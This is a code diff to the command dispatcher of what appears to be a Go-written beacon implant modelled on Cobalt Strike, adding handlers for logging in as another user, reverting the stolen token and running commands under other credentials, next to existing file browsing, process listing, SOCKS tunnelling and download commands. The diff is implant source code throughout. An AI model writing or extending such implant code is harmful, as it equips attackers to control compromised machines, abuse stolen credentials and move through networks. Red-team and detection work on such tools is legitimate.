@@ -111,7 +111,7 @@ func main() {
 										}
 
 										finalPacket = packet.MakePacket(packet.BEACON_RSP_DOWNLOAD_COMPLETE, requestIDBytes)
-										// packet.PushResult(finalPacket)
+										// packet.PushResult(finalPacket)break
 										resultBuf = append(resultBuf, finalPacket...)
 									case packet.CMD_TYPE_FILE_BROWSE:
 										dirResult := packet.File_Browse(cmdBuf)
@@ -147,12 +147,10 @@ func main() {
 									case packet.CMD_TYPE_PWD:
 										pwdResult := packet.GetCurrentDirectory()
 										finalPacket := packet.MakePacket(packet.BEACON_RSP_BEACON_GETCWD, pwdResult) // 32
-										// packet.PushResult(finalPacket)
 										resultBuf = append(resultBuf, finalPacket...)
 									case packet.CMD_TYPE_LIST_PROCESS:
 										processList := packet.ListProcesses()
 										finalPacket := packet.MakePacket(packet.BEACON_RSP_BEACON_OUTPUT_PS, processList)
-										// packet.PushResult(finalPacket)
 										resultBuf = append(resultBuf, finalPacket...)
 									case packet.CMD_TYPE_CONNECT:
 										target, port := packet.ParseCommandConnect(cmdBuf)
@@ -179,6 +177,14 @@ func main() {
 										packet.ParseSocksTraffic(cmdBuf)
 									case packet.CMD_TYPE_SOCKS_DIE:
 										packet.ParseSocksDie(cmdBuf)
+									case packet.CMD_TYPE_LOGIN_USER:
+										packet.ParseLoginUser(cmdBuf)
+									case packet.CMD_TYPE_REVTOSELF:
+										config.StoredCredentials = nil
+									case packet.CMD_TYPE_RUNAS:
+										result := packet.ParseRunAs(cmdBuf)
+										finalPacket := packet.MakePacket(0, result)
+										resultBuf = append(resultBuf, finalPacket...)
 									case packet.CMD_TYPE_EXIT:
 										os.Exit(0)
 									default:
@@ -189,7 +195,6 @@ func main() {
 										errMsgBytes := []byte("The feature you are trying to use is not implemented yet.")
 										result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
 										finalPacket := packet.MakePacket(31, result)
-										// packet.PushResult(finalPacket)
 										resultBuf = append(resultBuf, finalPacket...)
 
 									}
